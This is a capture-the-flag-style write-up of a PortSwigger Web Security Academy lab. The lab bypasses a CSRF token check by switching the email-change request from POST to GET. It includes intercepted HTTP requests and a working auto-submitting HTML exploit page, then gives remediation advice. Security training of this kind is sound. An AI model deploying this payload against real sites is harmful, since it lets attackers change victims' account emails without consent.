CSRF — Token Validation Depends on Request Method

Platform: PortSwigger Web Security Academy
Difficulty: Practitioner
Category: Cross-Site Request Forgery (CSRF)
Tools: Burp Suite, Burp Repeater, HTML, PortSwigger Exploit Server
Status: ✅ Solved
Challenge: 30 Days of Web Security — Day 01

1. Objective

The objective of this lab was to identify and exploit a CSRF protection bypass caused by inconsistent token validation across HTTP methods.

Unlike a basic CSRF vulnerability, this application included an anti-CSRF token. However, the protection could be bypassed by changing the HTTP request method.

2. Attack Scenario

An attacker wants to change the email address associated with an authenticated victim's account.

The attacker does not know the victim's password or session cookie.

However, the attacker discovers that the application accepts email changes through a GET request without validating the CSRF token.

The attacker can therefore create a malicious page that causes the victim's browser to submit the email change request.

If the browser includes the victim's session cookie, the application may process the request as an authenticated action.

3. Initial Request Analysis

I logged into the lab and intercepted an email change request using Burp Suite.

The application originally used a POST request containing an anti-CSRF token:

POST /my-account/change-email HTTP/2
Host: <LAB-HOST>
Cookie: session=<REDACTED>
Content-Type: application/x-www-form-urlencoded

email=test%40example.net&csrf=<REDACTED>

The presence of a CSRF token suggested that the application implemented a protection mechanism.

However, the presence of a token alone does not prove that the protection is enforced correctly.

4. CSRF Token Validation Test

I sent the POST request to Burp Repeater and replaced the original CSRF token with an invalid value:

POST /my-account/change-email HTTP/2
Host: <LAB-HOST>
Cookie: session=<REDACTED>
Content-Type: application/x-www-form-urlencoded

email=test%40example.net&csrf=12345

The server responded:

HTTP/2 400 Bad Request

Observation: The application rejected the POST request containing an invalid CSRF token.

This confirmed that CSRF token validation was enforced for the tested POST request.

5. HTTP Method Testing

I then investigated whether the endpoint also accepted other HTTP methods.

I changed the request method from POST to GET, moved the email parameter into the URL, and removed the CSRF token:

GET /my-account/change-email?email=csrf-test%40example.net HTTP/2
Host: <LAB-HOST>
Cookie: session=<REDACTED>

Result: The application accepted the request, and the account email address changed successfully.

This demonstrated that the same state-changing operation could be performed without CSRF token validation when using GET.

6. Exploitation Scenario

The vulnerability can be exploited by placing a specially crafted HTML form on an attacker-controlled website.

An authenticated victim who visits the page may unknowingly trigger the email change operation.

The attacker does not need to obtain the victim's session cookie directly. The browser may attach the appropriate cookie automatically.

Proof of Concept

I created the following HTML page using PortSwigger's Exploit Server:

<!DOCTYPE html>
<html>
<body>

<form action="https://<LAB-HOST>/my-account/change-email"
      method="GET">

    <input type="hidden"
           name="email"
           value="csrf-test@example.net">

</form>

<script>
    document.forms[0].submit();
</script>

</body>
</html>

The JavaScript automatically submits the form when the page loads.

Because the form uses GET, the browser places the email parameter in the request URL.

Verification
I hosted the HTML proof of concept on the PortSwigger Exploit Server.
I opened the exploit page in an authenticated test browser.
I confirmed that the account email address changed.
I delivered the exploit to the lab's simulated victim.
PortSwigger marked the laboratory as Solved.
7. Root Cause

The application enforced CSRF token validation for POST requests but allowed the same state-changing operation through GET without applying equivalent protection.

The vulnerability resulted from inconsistent server-side validation.

8. Security Impact

An attacker could potentially change an authenticated user's account email address without the user's consent.

Depending on the application's email verification and password recovery mechanisms, this could contribute to further account compromise.

The lab confirmed unauthorized email modification. It did not independently demonstrate a complete account takeover.

9. Remediation

Recommended security controls include:

Rejecting GET requests for state-changing operations.
Enforcing CSRF protection consistently across all supported methods.
Validating unpredictable anti-CSRF tokens on the server.
Using appropriate SameSite cookie settings as defense in depth.
Validating request origins where appropriate.
Requiring additional confirmation for sensitive account changes.

Key principle: A CSRF token is ineffective if the application allows an alternative route to the same operation without validating it.

10. Key Takeaways

This lab demonstrated the importance of testing the complete application workflow rather than assuming that the presence of a security mechanism guarantees protection.

I practiced:

Inspecting HTTP requests in Burp Suite.
Testing invalid CSRF tokens.
Identifying inconsistent validation across HTTP methods.
Building an HTML-based CSRF proof of concept.
Understanding how an attacker can use the victim's browser to trigger an authenticated action.
Documenting the vulnerability, impact, and remediation.
11. Evidence
Burp Repeater: Invalid CSRF token returning 400 Bad Request.
Burp Repeater: Successful GET request without a CSRF token.
PortSwigger Exploit Server: HTML proof of concept.
PortSwigger: Lab successfully solved.

Session identifiers and other sensitive values are redacted.

Testing environment: PortSwigger Web Security Academy
Scope: Authorized educational laboratory only.
